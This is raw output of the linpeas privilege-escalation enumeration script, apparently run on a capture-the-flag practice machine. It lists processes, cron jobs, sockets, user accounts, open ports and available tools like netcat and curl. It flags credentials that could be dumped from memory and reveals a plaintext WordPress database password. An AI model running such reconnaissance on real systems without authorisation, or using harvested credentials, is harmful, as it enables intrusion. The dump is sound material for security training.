www-data 11667  0.0  1.9 132044 19652 ?        S    18:59   0:00  _ /usr/sbin/apache2 -k start
www-data 11678  0.0  2.3 132252 24524 ?        S    19:00   0:00  _ /usr/sbin/apache2 -k start
www-data 11681  0.0  1.7 129936 17784 ?        S    19:00   0:00  _ /usr/sbin/apache2 -k start
www-data 11696  0.0  1.8 132056 18876 ?        S    19:01   0:00  _ /usr/sbin/apache2 -k start
www-data 11698  0.0  0.9 127428  9452 ?        S    19:02   0:00  _ /usr/sbin/apache2 -k start
www-data 11699  0.0  0.9 127428  9452 ?        S    19:02   0:00  _ /usr/sbin/apache2 -k start
www-data 11700  0.0  0.9 127428  9452 ?        S    19:02   0:00  _ /usr/sbin/apache2 -k start
nobody    2399  0.0  0.1   3180  1616 ?        Ss   18:48   0:00 /usr/sbin/atftpd --daemon --tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /home/www
root     11501  0.0  2.4 127032 24848 ?        Ss   18:48   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data 11504  0.0  0.5 127032  5940 ?        S    18:48   0:00  _ php-fpm: pool www
www-data 11505  0.0  0.5 127032  5940 ?        S    18:48   0:00  _ php-fpm: pool www
SHaysle+ 11875  0.0  0.4   6416  4200 ?        Ss   19:20   0:00 /lib/systemd/systemd --user
SHaysle+ 11877  0.0  0.1   7612  1352 ?        S    19:20   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Jun  3  2016 .
drwxr-xr-x 100 root root 12288 Jul  5 19:22 ..
-rw-r--r--   1 root root    56 Jun  3  2016 logrotate
-rw-r--r--   1 root root   589 Jul 16  2014 mdadm
-rw-r--r--   1 root root   670 Mar  1  2016 php
-rw-r--r--   1 root root   102 Jun  3  2016 .placeholder

/etc/cron.daily:
total 56
drwxr-xr-x   2 root root  4096 Jul  5 18:48 .
drwxr-xr-x 100 root root 12288 Jul  5 19:22 ..
-rwxr-xr-x   1 root root   539 Apr  5  2016 apache2
-rwxr-xr-x   1 root root   376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  1474 May  7  2019 apt-compat
-rwxr-xr-x   1 root root  1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root   372 May  6  2015 logrotate
-rwxr-xr-x   1 root root   539 Jul 16  2014 mdadm
-rwxr-xr-x   1 root root   249 Nov 12  2015 passwd
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   383 Mar  8  2016 samba
-rwxr-xr-x   1 root root   214 Apr 12  2016 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Jun  3  2016 .
drwxr-xr-x 100 root root 12288 Jul  5 19:22 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 20
drwxr-xr-x   2 root root  4096 Jun  3  2016 .
drwxr-xr-x 100 root root 12288 Jul  5 19:22 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 Jun  3  2016 .
drwxr-xr-x 100 root root 12288 Jul  5 19:22 ..
-rwxr-xr-x   1 root root    86 Apr 13  2016 fstrim
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   211 Apr 12  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/lib/systemd/system/emergency.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Wed 2022-07-06 06:42:11 BST  10h left n/a                          n/a          apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2022-07-06 09:03:07 BST  13h left Tue 2022-07-05 18:32:17 BST  1h 23min ago apt-daily.timer              apt-daily.service
Wed 2022-07-06 18:47:04 BST  22h left Tue 2022-07-05 18:47:04 BST  1h 9min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a      n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a      n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/anvil
/bounce
/bsmtp
/cleanup
/defer
/discard
/error
/flush
/ifmail
/lmtp
/local
/maildrop
/mailman
/pickup
/proxymap
/proxywrite
/qmgr
/relay
/retry
/rewrite
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/php/php7.0-fpm.sock
/run/samba/nmbd/unexpected
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/cgroups-agent
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1005/snapd-session-agent.socket
  └─(Read Write)
/run/user/1005/systemd/notify
  └─(Read Write)
/run/user/1005/systemd/private
  └─(Read Write)
/run/user/1013/systemd/private
/run/user/1028/systemd/private
/scache
/scalemail-backend
/showq
/smtp
/tlsmgr
/trace
/uucp
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/run/samba/nmbd/unexpected
  └─(Read Write)
/var/spool/postfix/dev/log
  └─(Read Write)
/verify
/virtual

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.1                                 656 systemd-logind  root             :1.1          systemd-logind.service    -          -
:1.26                              19741 busctl          SHayslett        :1.26         session-15.scope          15         -
:1.6                                   1 systemd         root             :1.6          init.scope                -          -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
org.freedesktop.DBus                 621 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -
org.freedesktop.PolicyKit1             - -               -                (activatable) -                         -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1               656 systemd-logind  root             :1.1          systemd-logind.service    -          -
org.freedesktop.network1               - -               -                (activatable) -                         -
org.freedesktop.resolve1               - -               -                (activatable) -                         -
org.freedesktop.systemd1               1 systemd         root             :1.6          init.scope                -          -
org.freedesktop.timedate1              - -               -                (activatable) -                         -


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                        ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
red.initech
127.0.0.1	localhost
127.0.1.1	red red.initech

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

0.0.0.0 fonts.googleapis.com
0.0.0.0 1.gravatar.com
0.0.0.0 wordpress.org
0.0.0.0 gmpg.org
0.0.0.0 0.gravatar.com
0.0.0.0 www.w3.org
0.0.0.0 update.wordpress.org
0.0.0.0 api.wordpress.org
0.0.0.0 ajax.aspnetcdn.com
0.0.0.0 planet.wordpress.org
0.0.0.0 codex.wordpress.org

nameserver 61.128.114.133
nameserver 61.128.114.134

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
enp0s3    Link encap:Ethernet  HWaddr 08:00:27:84:af:b6
          inet addr:192.168.0.150  Bcast:192.168.0.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:96466 errors:1 dropped:0 overruns:0 frame:0
          TX packets:91537 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:130369617 (130.3 MB)  TX bytes:11614471 (11.6 MB)
          Interrupt:9 Base address:0xd000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:3017 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3017 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:335774 (335.7 KB)  TX bytes:335774 (335.7 KB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:666             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:12380           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:12380           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:12380           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:12380           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:12380           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::139                  :::*                    LISTEN      -
tcp6       0      0 :::53                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -

╔══════════╣ Can I sniff with tcpdump?
No



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/zsh

╔══════════╣ Users with console
AParnell:x:1004:1004::/home/AParnell:/bin/bash
CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
CJoo:x:1014:1014::/home/CJoo:/bin/bash
Drew:x:1020:1020::/home/Drew:/bin/bash
DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
elly:x:1029:1029::/home/elly:/bin/bash
ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
jamie:x:1018:1018::/home/jamie:/bin/sh
JBare:x:1007:1007::/home/JBare:/bin/bash
jess:x:1021:1021::/home/jess:/bin/bash
JKanode:x:1013:1013::/home/JKanode:/bin/bash
JLipps:x:1017:1017::/home/JLipps:/bin/sh
kai:x:1025:1025::/home/kai:/bin/sh
LSolum:x:1008:1008::/home/LSolum:/bin/bash
MBassin:x:1006:1006::/home/MBassin:/bin/bash
mel:x:1024:1024::/home/mel:/bin/bash
MFrei:x:1010:1010::/home/MFrei:/bin/bash
NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
root:x:0:0:root:/root:/bin/zsh
Sam:x:1019:1019::/home/Sam:/bin/zsh
SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
SHAY:x:1022:1022::/home/SHAY:/bin/bash
SStroud:x:1011:1011::/home/SStroud:/bin/bash
Taylor:x:1023:1023::/home/Taylor:/bin/sh
zoe:x:1026:1026::/home/zoe:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
uid=1001(RNunemaker) gid=1001(RNunemaker) groups=1001(RNunemaker)
uid=1002(ETollefson) gid=1002(ETollefson) groups=1002(ETollefson)
uid=1003(DSwanger) gid=1003(DSwanger) groups=1003(DSwanger)
uid=1004(AParnell) gid=1004(AParnell) groups=1004(AParnell)
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
uid=1006(MBassin) gid=1006(MBassin) groups=1006(MBassin)
uid=1007(JBare) gid=1007(JBare) groups=1007(JBare)
uid=1008(LSolum) gid=1008(LSolum) groups=1008(LSolum)
uid=1009(IChadwick) gid=1009(IChadwick) groups=1009(IChadwick)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1010(MFrei) gid=1010(MFrei) groups=1010(MFrei)
uid=1011(SStroud) gid=1011(SStroud) groups=1011(SStroud)
uid=1012(CCeaser) gid=1012(CCeaser) groups=1012(CCeaser)
uid=1013(JKanode) gid=1013(JKanode) groups=1013(JKanode)
uid=1014(CJoo) gid=1014(CJoo) groups=1014(CJoo)
uid=1015(Eeth) gid=1015(Eeth) groups=1015(Eeth)
uid=1016(LSolum2) gid=1016(LSolum2) groups=1016(LSolum2)
uid=1017(JLipps) gid=1017(JLipps) groups=1017(JLipps)
uid=1018(jamie) gid=1018(jamie) groups=1018(jamie)
uid=1019(Sam) gid=1019(Sam) groups=1019(Sam)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=1020(Drew) gid=1020(Drew) groups=1020(Drew)
uid=1021(jess) gid=1021(jess) groups=1021(jess)
uid=1022(SHAY) gid=1022(SHAY) groups=1022(SHAY)
uid=1023(Taylor) gid=1023(Taylor) groups=1023(Taylor)
uid=1024(mel) gid=1024(mel) groups=1024(mel)
uid=1025(kai) gid=1025(kai) groups=1025(kai)
uid=1026(zoe) gid=1026(zoe) groups=1026(zoe)
uid=1027(NATHAN) gid=1027(NATHAN) groups=1027(NATHAN)
uid=1028(www) gid=1028(www) groups=1028(www)
uid=1029(elly) gid=1029(elly) groups=1029(elly)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(ftp) gid=116(ftp) groups=116(ftp)
uid=111(mysql) gid=117(mysql) groups=117(mysql)
uid=112(postfix) gid=118(postfix) groups=118(postfix)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 19:56:09 up  1:24,  1 user,  load average: 0.37, 0.10, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
SHayslet pts/1    192.168.0.100    19:20   24.00s  0.06s  0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
SHayslett pts/0        Thu Jun 30 06:15:26 2022 - Thu Jun 30 13:31:36 2022  (07:16)     192.168.0.100
reboot   system boot  Thu Jun 30 03:12:35 2022 - Thu Jun 30 14:18:20 2022  (11:05)     0.0.0.0
reboot   system boot  Thu Jun 30 01:24:03 2022 - Thu Jun 30 14:18:20 2022  (12:54)     0.0.0.0
reboot   system boot  Wed Jun 29 18:51:13 2022 - Thu Jun 30 14:18:20 2022  (19:27)     0.0.0.0
reboot   system boot  Wed Jun 29 10:45:09 2022 - Thu Jun 30 14:18:20 2022 (1+03:33)    0.0.0.0
reboot   system boot  Tue Jun 28 15:54:28 2022 - Thu Jun 30 14:18:20 2022 (1+22:23)    0.0.0.0
reboot   system boot  Tue Jun 28 13:15:17 2022 - Thu Jun 30 14:18:20 2022 (2+01:03)    0.0.0.0
reboot   system boot  Tue Jun  7 11:57:37 2016 - Thu Jun 30 14:18:20 2022 (2214+02:20) 0.0.0.0

wtmp begins Tue Jun  7 11:52:47 2016

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root                                       Thu Jan  1 01:00:10 +0100 1970
peter            pts/2    127.0.0.1        Tue Jul  5 19:36:52 +0100 2022
SHayslett        pts/1    192.168.0.100    Tue Jul  5 19:20:36 +0100 2022
JKanode          pts/2    127.0.0.1        Tue Jul  5 19:36:12 +0100 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                       ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/authbind
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lxc
/usr/bin/make
/bin/nc
/bin/nc.traditional
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                4:5.3.1-1ubuntu1                           i386         GNU C++ compiler
ii  g++-5                              5.4.0-6ubuntu1~16.04.12                    i386         GNU C++ compiler
ii  gcc                                4:5.3.1-1ubuntu1                           i386         GNU C compiler
ii  gcc-5                              5.4.0-6ubuntu1~16.04.12                    i386         GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL
mysql  Ver 14.14 Distrib 5.7.33, for Linux (i686) using  EditLine wrapper

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Jul  5 18:48 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2016-04-15T18:00:57
httpd Not Found

Nginx version: nginx Not Found

./linpeas.sh: 2593: ./linpeas.sh: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jun  4  2016 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Jun  4  2016 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jun  3  2016 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/default-ssl.conf
<IfModule mod_ssl.c>
	<VirtualHost _default_:12380>
		ServerAdmin garry@red
		DocumentRoot /var/www/https
		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined
		SSLEngine on
		SSLCertificateFile	/etc/ssl/certs/red.crt
		SSLCertificateKeyFile /etc/ssl/certs/red.key
		<FilesMatch "\.(cgi|shtml|phtml|php)$">
				SSLOptions +StdEnvVars
		</FilesMatch>
		<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
		</Directory>
		ErrorDocument 400 /custom_400.html
	</VirtualHost>
</IfModule>


-rw-r--r-- 1 root root 1332 Mar 19  2016 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jun  3  2016 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/default-ssl.conf
<IfModule mod_ssl.c>
	<VirtualHost _default_:12380>
		ServerAdmin garry@red
		DocumentRoot /var/www/https
		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined
		SSLEngine on
		SSLCertificateFile	/etc/ssl/certs/red.crt
		SSLCertificateKeyFile /etc/ssl/certs/red.key
		<FilesMatch "\.(cgi|shtml|phtml|php)$">
				SSLOptions +StdEnvVars
		</FilesMatch>
		<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
		</Directory>
		ErrorDocument 400 /custom_400.html
	</VirtualHost>
</IfModule>

-rw-r--r-- 1 root root 69271 Jun  3  2016 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Oct  8  2020 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70999 Oct  8  2020 /etc/php/7.0/fpm/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 root root 3042 Jun  4  2016 /var/www/https/blogblog/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Jul  5 18:48 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)


-rw-r--r-- 1 SHayslett SHayslett 222 Jul  5 19:24 /home/SHayslett/.ssh/known_hosts
|1|JI4vRPqm2sIyf+EcowPgmx7hm8U=|9cmh9BjKOo3TgoQo1GdxswIK0GU= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=



Port 22
PermitRootLogin without-password
PubkeyAuthentication yes
PermitEmptyPasswords yes
ChallengeResponseAuthentication no
PasswordAuthentication yes
UsePAM yes

══╣ Possible private SSH keys were found!
/home/SHayslett/.config/lxc/client.key

══╣ Some certificates were found (out limited):
/var/spool/postfix/etc/ssl/certs/ca-certificates.crt
12466PSTORAGE_CERTSBIN

./linpeas.sh: 2779: ./linpeas.sh: gpg-connect-agent: not found
══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config
AuthorizedKeysFile	.ssh/authorized_keys
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jul  5 18:48 /etc/pam.d
-rw-r--r-- 1 root root 2133 Apr 16  2016 /etc/pam.d/sshd


╔══════════╣ Searching kerberos conf files and tickets
╚ http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory
ptrace protection is enabled (1), you need to disable it to search for tickets inside processes memory
-rw-r--r-- 1 root root 89 Jul 21  2015 /usr/share/samba/setup/krb5.conf
[libdefaults]
	default_realm = ${REALM}
	dns_lookup_realm = false
	dns_lookup_kdc = true
tickets kerberos Not Found
klist Not Found



╔══════════╣ Searching AD cached hashes
-rw------- 1 root root 430080 Jun  3  2016 /var/lib/samba/private/secrets.tdb

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.1


/tmp/tmux-1005
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun  3  2016 /usr/share/keyrings
drwxr-xr-x 2 root root 4096 Jun  3  2016 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd
